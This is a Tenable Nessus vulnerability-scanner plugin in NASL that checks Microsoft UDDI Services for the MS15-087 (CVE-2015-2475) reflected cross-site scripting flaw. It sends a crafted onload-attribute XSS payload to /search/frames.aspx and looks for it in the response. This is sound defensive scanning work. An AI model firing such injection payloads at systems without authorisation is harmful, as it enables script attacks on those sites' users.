#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(85380);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/08/16 04:43:09 $");

  script_cve_id("CVE-2015-2475");
  script_bugtraq_id(76259);
  script_osvdb_id(125995);
  script_xref(name:"MSFT", value:"MS15-087");
  script_xref(name:"IAVB", value:"2015-B-0097");

  script_name(english:"MS15-087: Vulnerability in UDDI Services Could Allow Elevation of Privilege (3082459) (uncredentialed check)");
  script_summary(english:"Attempts to execute a cross-site scripting exploit against the UDDI service.");

  script_set_attribute(attribute:"synopsis", value:
"The remote Windows host is affected by an elevation of privilege
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Windows host is affected by an elevation of privilege
vulnerability in the Universal Description, Discovery, and Integration
(UDDI) Services component due to improper validation and sanitization
of user-supplied input to the 'searchID' parameter of the 'explorer'
frame in frames.aspx. A remote attacker can exploit this vulnerability
by submitting a specially crafted URL to a target site, resulting in
the execution of arbitrary script code in the context of the current
user.

Note: During testing it was discovered that BizTalk configurations
running on Windows versions not specified in the bulletin were also
impacted. Therefore, this plugin checks the vulnerability state of the
cross-site scripting flaw and not the specific OS variant.");
  script_set_attribute(attribute:"see_also", value:"https://technet.microsoft.com/library/security/MS15-087");
  script_set_attribute(attribute:"solution", value:
"Microsoft has released a set of patches for UDDI Services including
patches for Windows 2008, Microsoft BizTalk Server 2010, 2013, and
2013 R2.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/08/11");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/08/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/08/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:microsoft:windows");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:biztalk_server");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:microsoft:uddi_services");
  script_set_attribute(attribute:"stig_severity", value:"II");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("microsoft_uddi_services_detect.nbin");
  script_require_keys("installed_sw/Microsoft UDDI Services");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "Microsoft UDDI Services";
get_install_count(app_name: app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port : port
);

dir = install['path'];

xss = 'nessus\' onload=\'alert("' + SCRIPT_NAME + '-' + unixtime() + '")\'><foo id=\'bar';
expected_output = '&search=' + xss;

exploit = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir),
  cgi      : '/search/frames.aspx',
  qs       : 'frames=true&search=' + urlencode(str:xss),
  pass_str : expected_output,
  ctrl_re  : '<title>UDDI Services</title>'
);

if (!exploit)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));
